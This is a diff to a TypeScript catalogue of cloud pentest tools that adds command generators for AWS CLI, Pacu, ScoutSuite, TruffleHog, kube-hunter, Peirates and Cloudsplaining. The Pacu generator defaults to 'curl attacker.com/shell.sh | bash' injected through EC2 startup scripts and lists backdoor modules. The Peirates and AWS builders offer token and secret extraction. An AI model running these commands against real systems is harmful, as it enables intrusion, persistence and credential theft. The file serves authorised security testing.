@@ -51,15 +51,35 @@ export const cloudSecurityTools: Tool[] = [
     website: 'https://aws.amazon.com/cli/',
     interactiveCommands: [
       {
-        name: 'AWS Credential Validation',
-        description: 'Validate leaked AWS credentials and enumerate basic account info.',
+        name: 'AWS CLI Toolkit Builder',
+        description: 'Comprehensive builder for AWS CLI commands covering IAM, S3, EC2, and Secrets extraction.',
         inputs: [
-          { id: 'accessKey', label: 'Access Key ID', type: 'text', defaultValue: 'AKIAIOSFODNN7EXAMPLE', placeholder: 'AWS Access Key ID' },
-          { id: 'secretKey', label: 'Secret Access Key', type: 'text', defaultValue: 'wJalrXUtnFEMI...', placeholder: 'AWS Secret Access Key' },
-          { id: 'region', label: 'Region', type: 'select', defaultValue: 'us-east-1', options: ['us-east-1', 'us-west-2', 'ap-south-1', 'eu-west-1'] },
+          { id: 'service', label: 'AWS Action', type: 'select', options: ['sts get-caller-identity', 'iam list-users', 'iam list-roles', 'iam get-user', 's3 ls', 's3 cp', 'ec2 describe-instances', 'secretsmanager get-secret-value', 'lambda list-functions'], defaultValue: 'sts get-caller-identity' },
+          { id: 'target', label: 'Target / ID', type: 'text', defaultValue: '', placeholder: 'e.g., s3://bucket/file or Username', helpText: 'Required for get-user, s3 cp, and get-secret-value' },
+          { id: 'downloadPath', label: 'Download Path (s3 cp)', type: 'text', defaultValue: '/tmp/', placeholder: 'Local path for S3 downloads' },
+          { id: 'profile', label: 'Profile (--profile)', type: 'text', defaultValue: '', placeholder: 'Named profile in ~/.aws/credentials' },
+          { id: 'region', label: 'Region (--region)', type: 'select', options: ['us-east-1', 'us-west-2', 'eu-west-1', 'ap-south-1', 'Global'], defaultValue: 'us-east-1' },
+          { id: 'outputFmt', label: 'Output Format (--output)', type: 'select', options: ['json', 'table', 'text'], defaultValue: 'json' },
+          { id: 'query', label: 'JMESPath Filter (--query)', type: 'text', defaultValue: '', placeholder: 'e.g., Reservations[*].Instances[*].InstanceId' },
+          { id: 'recursive', label: 'Recursive (S3)', type: 'checkbox', defaultValue: 'false', placeholder: 'For s3 ls or cp operations' },
+          { id: 'noSsl', label: 'Skip SSL Verify', type: 'checkbox', defaultValue: 'false', placeholder: '--no-verify-ssl' }
         ],
         generator: (inputs) => {
-          return `AWS_ACCESS_KEY_ID=${inputs.accessKey} AWS_SECRET_ACCESS_KEY=${inputs.secretKey} aws sts get-caller-identity --region ${inputs.region}`;
+          let cmd = `aws ${inputs.service}`;
+          
+          if (inputs.service === 'iam get-user' && inputs.target) cmd += ` --user-name ${inputs.target}`;
+          if (inputs.service.startsWith('s3 ls') && inputs.target) cmd += ` ${inputs.target}`;
+          if (inputs.service === 's3 cp' && inputs.target) cmd += ` ${inputs.target} ${inputs.downloadPath || '.'}`;
+          if (inputs.service === 'secretsmanager get-secret-value' && inputs.target) cmd += ` --secret-id ${inputs.target}`;
+          
+          if (inputs.recursive === 'true' && inputs.service.startsWith('s3')) cmd += ' --recursive';
+          if (inputs.profile) cmd += ` --profile ${inputs.profile}`;
+          if (inputs.region && inputs.region !== 'Global') cmd += ` --region ${inputs.region}`;
+          if (inputs.outputFmt && inputs.outputFmt !== 'json') cmd += ` --output ${inputs.outputFmt}`;
+          if (inputs.query) cmd += ` --query "${inputs.query}"`;
+          if (inputs.noSsl === 'true') cmd += ' --no-verify-ssl';
+          
+          return cmd;
         }
       }
     ]
@@ -114,6 +134,36 @@ export const cloudSecurityTools: Tool[] = [
     relatedTools: ['awscli', 'scoutsuite', 'cloudsplaining'],
     installation: 'git clone https://github.com/RhinoSecurityLabs/pacu.git && cd pacu && pip3 install -r requirements.txt',
     website: 'https://github.com/RhinoSecurityLabs/pacu',
+    interactiveCommands: [
+      {
+        name: 'Pacu Module Executor',
+        description: 'Generate commands for Pacu exploitation modules, targeting IAM, EC2, S3, and Serverless.',
+        inputs: [
+          { id: 'module', label: 'Exploitation Module', type: 'select', options: ['iam__enum_users_roles_policies_groups', 'iam__privesc_scan', 'iam__backdoor_users_keys', 's3__bucket_finder', 's3__download_bucket', 'ec2__enum', 'ec2__startup_shell_script', 'lambda__enum', 'lambda__backdoor_new_roles', 'secretsmanager__enum', 'ssm__download_parameters', 'cloudtrail__download_event_history'], defaultValue: 'iam__privesc_scan' },
+          { id: 'usernames', label: 'Target Usernames', type: 'text', defaultValue: '', placeholder: 'e.g., admin,jsmith (for backdoor)' },
+          { id: 'instanceIds', label: 'EC2 Instance IDs', type: 'text', defaultValue: '', placeholder: 'e.g., i-0abc123 (for shell script)' },
+          { id: 'script', label: 'Shell Command', type: 'text', defaultValue: 'curl attacker.com/shell.sh | bash', placeholder: 'Command to inject' },
+          { id: 'regions', label: 'Target Regions', type: 'text', defaultValue: '', placeholder: 'e.g., us-east-1,us-west-2' },
+          { id: 'session', label: 'Session Name', type: 'text', defaultValue: '', placeholder: 'Use specific session' }
+        ],
+        generator: (inputs) => {
+          let cmd = `run ${inputs.module}`;
+          if (inputs.module === 'iam__backdoor_users_keys' && inputs.usernames) {
+            cmd += ` --usernames ${inputs.usernames}`;
+          }
+          if (inputs.module === 'ec2__startup_shell_script' && inputs.instanceIds && inputs.script) {
+            cmd += ` --instance-ids ${inputs.instanceIds} --script "${inputs.script}"`;
+          }
+          if (inputs.regions) {
+            cmd += ` --regions ${inputs.regions}`;
+          }
+          if (inputs.session) {
+            cmd += ` --session ${inputs.session}`;
+          }
+          return cmd;
+        }
+      }
+    ]
   },
   {
     id: 'scoutsuite',
@@ -161,14 +211,31 @@ export const cloudSecurityTools: Tool[] = [
     website: 'https://github.com/nccgroup/ScoutSuite',
     interactiveCommands: [
       {
-        name: 'Cloud Security Audit',
-        description: 'Generate a ScoutSuite cloud audit command for any provider.',
+        name: 'ScoutSuite Auditor Builder',
+        description: 'Generate multi-cloud audit commands with detailed scope and execution controls.',
         inputs: [
-          { id: 'provider', label: 'Cloud Provider', type: 'select', defaultValue: 'aws', options: ['aws', 'azure', 'gcp'] },
-          { id: 'services', label: 'Services (space-separated)', type: 'text', defaultValue: 's3 iam ec2', placeholder: 'e.g., s3 iam ec2 lambda' },
+          { id: 'provider', label: 'Cloud Provider', type: 'select', defaultValue: 'aws', options: ['aws', 'azure', 'gcp', 'oci', 'aliyun'] },
+          { id: 'authMethod', label: 'Authentication Mode', type: 'select', defaultValue: 'Default Profile/CLI', options: ['Default Profile/CLI', 'Explicit Keys (--access-key-id)', 'Azure CLI (--cli)', 'GCP User (--user-account)'] },
+          { id: 'services', label: 'Target Services', type: 'text', defaultValue: '', placeholder: 'e.g., s3 iam ec2 (leave blank for all)' },
+          { id: 'regions', label: 'Target Regions', type: 'text', defaultValue: '', placeholder: 'e.g., us-east-1 eu-west-1' },
+          { id: 'workers', label: 'Parallel Workers', type: 'text', defaultValue: '10', placeholder: 'Max API threads' },
+          { id: 'reportDir', label: 'Report Directory', type: 'text', defaultValue: 'scout-report', placeholder: 'Output folder' },
+          { id: 'noBrowser', label: 'Headless Mode', type: 'checkbox', defaultValue: 'true', placeholder: 'Do not open browser' }
         ],
         generator: (inputs) => {
-          return `python3 scout.py ${inputs.provider} --services ${inputs.services} --no-browser`;
+          let cmd = `python3 scout.py ${inputs.provider}`;
+          
+          if (inputs.authMethod === 'Azure CLI (--cli)' && inputs.provider === 'azure') cmd += ' --cli';
+          if (inputs.authMethod === 'GCP User (--user-account)' && inputs.provider === 'gcp') cmd += ' --user-account';
+          if (inputs.authMethod === 'Explicit Keys (--access-key-id)' && inputs.provider === 'aws') cmd += ' --access-key-id AKIA... --secret-access-key SAK...';
+          
+          if (inputs.services) cmd += ` --services ${inputs.services}`;
+          if (inputs.regions) cmd += ` --regions ${inputs.regions}`;
+          if (inputs.reportDir) cmd += ` --report-dir ${inputs.reportDir}`;
+          if (inputs.workers && inputs.workers !== '10') cmd += ` --max-workers ${inputs.workers}`;
+          if (inputs.noBrowser === 'true') cmd += ' --no-browser';
+          
+          return cmd;
         }
       }
     ]
@@ -222,16 +289,38 @@ export const cloudSecurityTools: Tool[] = [
     website: 'https://github.com/trufflesecurity/trufflehog',
     interactiveCommands: [
       {
-        name: 'GitHub Secret Scanner',
-        description: 'Generate a TruffleHog command to scan a GitHub repo or org for leaked secrets.',
+        name: 'TruffleHog Leak Scanner',
+        description: 'Build comprehensive secret scanning commands across Git, GitHub, GitLab, S3, Docker, and filesystems.',
         inputs: [
-          { id: 'target', label: 'GitHub Repo URL or Org', type: 'text', defaultValue: 'https://github.com/target/repo', placeholder: 'Full repo URL or org name' },
-          { id: 'mode', label: 'Scan Mode', type: 'select', defaultValue: 'git', options: ['git', 'github --org='] },
-          { id: 'verified', label: 'Only Verified?', type: 'select', defaultValue: '--only-verified', options: ['--only-verified', ''] },
+          { id: 'targetType', label: 'Target Type', type: 'select', defaultValue: 'git', options: ['git', 'github', 'gitlab', 's3', 'docker', 'filesystem', 'circleci'] },
+          { id: 'target', label: 'Target URL / Path', type: 'text', defaultValue: 'https://github.com/target/repo', placeholder: 'Repo URL, S3 bucket, or path' },
+          { id: 'orgMode', label: 'Scan Entire Org', type: 'checkbox', defaultValue: 'false', placeholder: 'Use --org instead of direct target (GitHub/GitLab)' },
+          { id: 'verified', label: 'Verified Only', type: 'checkbox', defaultValue: 'true', placeholder: 'Check if secrets are active' },
+          { id: 'jsonOutput', label: 'JSON Output', type: 'checkbox', defaultValue: 'false', placeholder: 'Format for parsing' },
+          { id: 'detectors', label: 'Specific Detectors', type: 'text', defaultValue: '', placeholder: 'e.g., aws,slack (comma separated)' },
+          { id: 'concurrency', label: 'Concurrency', type: 'text', defaultValue: '10', placeholder: 'Parallel workers' }
         ],
         generator: (inputs) => {
-          const verFlag = inputs.verified ? ` ${inputs.verified}` : '';
-          return `trufflehog ${inputs.mode}${inputs.mode.includes('org') ? inputs.target : ' ' + inputs.target}${verFlag} --json`;
+          let cmd = `trufflehog ${inputs.targetType}`;
+          
+          if (inputs.orgMode === 'true' && (inputs.targetType === 'github' || inputs.targetType === 'gitlab')) {
+            cmd += ` --org=${inputs.target}`;
+          } else if (inputs.targetType === 'git' || inputs.targetType === 'filesystem') {
+            cmd += ` ${inputs.target}`;
+          } else if (inputs.targetType === 'github' || inputs.targetType === 'gitlab') {
+            cmd += ` --repo=${inputs.target}`;
+          } else if (inputs.targetType === 's3') {
+            cmd += ` --bucket=${inputs.target}`;
+          } else if (inputs.targetType === 'docker') {
+            cmd += ` --image=${inputs.target}`;
+          }
+          
+          if (inputs.verified === 'true') cmd += ' --only-verified';
+          if (inputs.jsonOutput === 'true') cmd += ' --json';
+          if (inputs.detectors) cmd += ` --include-detectors=${inputs.detectors}`;
+          if (inputs.concurrency && inputs.concurrency !== '10') cmd += ` --concurrency=${inputs.concurrency}`;
+          
+          return cmd;
         }
       }
     ]
@@ -276,6 +365,38 @@ export const cloudSecurityTools: Tool[] = [
     relatedTools: ['peirates', 'kubectl', 'trivy'],
     installation: 'pip install kube-hunter   # or: docker run -it aquasec/kube-hunter',
     website: 'https://github.com/aquasecurity/kube-hunter',
+    interactiveCommands: [
+      {
+        name: 'Kube-Hunter Assessor',
+        description: 'Build Kubernetes security auditing commands for external and internal (pod) assessments.',
+        inputs: [
+          { id: 'mode', label: 'Assessment Mode', type: 'select', options: ['Remote IP/Domain (--remote)', 'Internal Pod (--pod)', 'CIDR Sweep (--cidr)', 'Local API (--interface)'], defaultValue: 'Remote IP/Domain (--remote)' },
+          { id: 'target', label: 'Target Scope', type: 'text', defaultValue: '10.10.0.100', placeholder: 'IP, CIDR, or interface name' },
+          { id: 'active', label: 'Active Exploitation', type: 'checkbox', defaultValue: 'false', placeholder: 'Attempt real exploits (Danger!)' },
+          { id: 'logLevel', label: 'Log Level', type: 'select', options: ['INFO', 'DEBUG', 'WARNING'], defaultValue: 'INFO' },
+          { id: 'report', label: 'Report Format', type: 'select', options: ['Plain Text', 'JSON (--report json)', 'YAML (--report yaml)'], defaultValue: 'Plain Text' },
+          { id: 'dispatch', label: 'Dispatch Type', type: 'select', options: ['None', 'http', 'sqs', 'webhook'], defaultValue: 'None' }
+        ],
+        generator: (inputs) => {
+          let cmd = 'kube-hunter';
+          
+          if (inputs.mode.includes('--remote')) cmd += ` --remote ${inputs.target}`;
+          else if (inputs.mode.includes('--pod')) cmd += ' --pod';
+          else if (inputs.mode.includes('--cidr')) cmd += ` --cidr ${inputs.target}`;
+          else if (inputs.mode.includes('--interface')) cmd += ` --interface ${inputs.target}`;
+          
+          if (inputs.active === 'true') cmd += ' --active';
+          if (inputs.logLevel !== 'INFO') cmd += ` --log ${inputs.logLevel}`;
+          
+          if (inputs.report === 'JSON (--report json)') cmd += ' --report json';
+          else if (inputs.report === 'YAML (--report yaml)') cmd += ' --report yaml';
+          
+          if (inputs.dispatch !== 'None') cmd += ` --dispatch ${inputs.dispatch}`;
+          
+          return cmd;
+        }
+      }
+    ]
   },
   {
     id: 'peirates',
@@ -315,6 +436,31 @@ export const cloudSecurityTools: Tool[] = [
     relatedTools: ['kube-hunter', 'kubectl', 'aws-cli'],
     installation: 'git clone https://github.com/inguardians/peirates && cd peirates && go build .',
     website: 'https://github.com/inguardians/peirates',
+    interactiveCommands: [
+      {
+        name: 'Peirates Kubernetes Pivot',
+        description: 'Auto-generate peirates execution and module commands for Kubernetes post-exploitation.',
+        inputs: [
+          { id: 'action', label: 'Execution Mode', type: 'select', options: ['Launch Interactive Menu', 'Single Command Line Exec'], defaultValue: 'Launch Interactive Menu' },
+          { id: 'module', label: 'Direct Module (Exec)', type: 'select', options: ['aws-get-tokens', 'get-service-acct-tokens', 'enumerate-rbac', 'get-secrets', 'run-command'], defaultValue: 'enumerate-rbac' },
+          { id: 'namespace', label: 'Namespace Target', type: 'text', defaultValue: '', placeholder: 'e.g., kube-system' },
+          { id: 'pod', label: 'Target Pod', type: 'text', defaultValue: '', placeholder: 'Required for run-command' },
+          { id: 'command', label: 'Command Payload', type: 'text', defaultValue: 'id', placeholder: 'Used with run-command' },
+          { id: 'debug', label: 'Debug Mode', type: 'checkbox', defaultValue: 'false', placeholder: 'Verbose logging' }
+        ],
+        generator: (inputs) => {
+          if (inputs.action === 'Launch Interactive Menu') {
+            return './peirates';
+          }
+          let cmd = `peirates ${inputs.module}`;
+          if (inputs.namespace) cmd += ` --namespace ${inputs.namespace}`;
+          if (inputs.module === 'run-command' && inputs.pod) cmd += ` --pod ${inputs.pod}`;
+          if (inputs.module === 'run-command' && inputs.command) cmd += ` --command "${inputs.command}"`;
+          if (inputs.debug === 'true') cmd += ' --debug';
+          return cmd;
+        }
+      }
+    ]
   },
   {
     id: 'cloudsplaining',
@@ -352,5 +498,37 @@ export const cloudSecurityTools: Tool[] = [
     relatedTools: ['pacu', 'awscli', 'iamlive'],
     installation: 'pip install cloudsplaining',
     website: 'https://github.com/salesforce/cloudsplaining',
+    interactiveCommands: [
+      {
+        name: 'Cloudsplaining IAM Audit',
+        description: 'Generate commands to analyze AWS IAM configurations for least-privilege violations and risks.',
+        inputs: [
+          { id: 'action', label: 'Action', type: 'select', options: ['download', 'analyze', 'scan-policy-file'], defaultValue: 'analyze' },
+          { id: 'profile', label: 'AWS Profile', type: 'text', defaultValue: 'default', placeholder: 'Used for download action' },
+          { id: 'inputFile', label: 'Input JSON File', type: 'text', defaultValue: 'account-authorization-details.json', placeholder: 'Data file or policy file' },
+          { id: 'outputDir', label: 'Report Directory', type: 'text', defaultValue: 'cloudsplaining-report/', placeholder: 'Where to save HTML report' },
+          { id: 'exclusions', label: 'Exclusions File', type: 'text', defaultValue: '', placeholder: 'Path to exclusions.yml' },
+          { id: 'skipInline', label: 'Skip Inline Policies', type: 'checkbox', defaultValue: 'false', placeholder: 'Do not analyze inline policies' },
+          { id: 'skipAws', label: 'Skip AWS Managed', type: 'checkbox', defaultValue: 'false', placeholder: 'Do not analyze AWS managed policies' }
+        ],
+        generator: (inputs) => {
+          let cmd = `cloudsplaining ${inputs.action}`;
+          
+          if (inputs.action === 'download') {
+            cmd += ` --profile ${inputs.profile}`;
+          } else if (inputs.action === 'analyze') {
+            cmd += ` --file ${inputs.inputFile} --output-directory ${inputs.outputDir}`;
+            if (inputs.exclusions) cmd += ` --exclusions-file ${inputs.exclusions}`;
+            if (inputs.skipInline === 'true') cmd += ' --skip-inline';
+            if (inputs.skipAws === 'true') cmd += ' --skip-aws-managed';
+          } else if (inputs.action === 'scan-policy-file') {
+            cmd += ` --input-file ${inputs.inputFile}`;
+            if (inputs.exclusions) cmd += ` --exclusions-file ${inputs.exclusions}`;
+          }
+          
+          return cmd;
+        }
+      }
+    ]
   },
 ];
